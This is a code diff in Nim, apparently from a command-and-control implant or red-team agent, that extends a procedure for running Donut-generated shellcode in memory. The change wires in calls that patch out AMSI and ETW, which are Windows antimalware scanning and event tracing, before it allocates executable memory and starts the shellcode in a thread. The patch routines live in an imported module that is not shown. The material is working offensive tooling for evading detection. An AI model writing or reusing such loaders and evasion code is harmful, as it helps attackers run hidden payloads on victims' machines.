@@ -4,6 +4,7 @@ import std/[json, base64, strformat]
 
 when defined(windows):
   import winim/lean
+  import ../utils/patches
 
 type
   DonutArgs = object
@@ -95,15 +96,33 @@ proc executeDonutShellcode*(taskId: string, shellcode: seq[byte], params: JsonNo
       if cfg.debug:
         echo "[DEBUG] Executing donut shellcode (", shellcode.len, " bytes)"
       
+      var output = ""
+      
       # Patch AMSI if requested
       if args.patch_amsi_arg:
-        # TODO: Implement AMSI patching if needed
-        discard
+        let res = patchAMSI()
+        case res
+        of 0:
+          output.add("[+] AMSI patched successfully\n")
+        of 1:
+          output.add("[-] Failed to patch AMSI\n")
+        of 2:
+          output.add("[+] AMSI already patched\n")
+        else:
+          discard
       
       # Block ETW if requested  
       if args.block_etw_arg:
-        # TODO: Implement ETW blocking if needed
-        discard
+        let res = patchETW()
+        case res
+        of 0:
+          output.add("[+] ETW patched successfully\n")
+        of 1:
+          output.add("[-] Failed to patch ETW\n")
+        of 2:
+          output.add("[+] ETW already patched\n")
+        else:
+          discard
       
       # Validate shellcode
       if shellcode.len == 0:
@@ -112,7 +131,7 @@ proc executeDonutShellcode*(taskId: string, shellcode: seq[byte], params: JsonNo
       if cfg.debug:
         echo &"[DEBUG] Donut: Allocating {shellcode.len} bytes for shellcode"
       
-      # Allocate executable memory FIRST (before any pipe/thread setup)
+      # Allocate executable memory
       let pShellcode = VirtualAlloc(
         nil,
         SIZE_T(shellcode.len),
@@ -161,19 +180,20 @@ proc executeDonutShellcode*(taskId: string, shellcode: seq[byte], params: JsonNo
       if cfg.debug:
         echo &"[DEBUG] Donut: Wait completed with result: {waitResult}"
       
-      var output = ""
+      # Append execution result to output
       case waitResult:
       of WAIT_OBJECT_0:
-        output = &"[+] Donut shellcode executed successfully for {args.assembly_name}\n"
+        output.add(&"[+] Donut shellcode executed successfully for {args.assembly_name}\n")
       of WAIT_TIMEOUT:
-        output = &"[!] Donut shellcode execution timed out after {timeoutSec} seconds\n"
+        output.add(&"[!] Donut shellcode execution timed out after {timeoutSec} seconds\n")
         discard TerminateThread(hThread, 0)
       else:
-        output = &"[+] Donut shellcode execution completed with wait result: {waitResult}\n"
+        output.add(&"[+] Donut shellcode execution completed with wait result: {waitResult}\n")
       
-      output.add("\nNote: Assembly output redirection is not yet implemented for donut.\n")
-      output.add("Output may appear in the agent's console/logs instead.\n")
+      output.add("\nNote: Assembly console output will appear in the agent's stdout/stderr.\n")
+      output.add("For captured output, use execute-assembly command instead.\n")
       
+      # Cleanup
       CloseHandle(hThread)
       discard VirtualFree(pShellcode, 0, MEM_RELEASE)
       
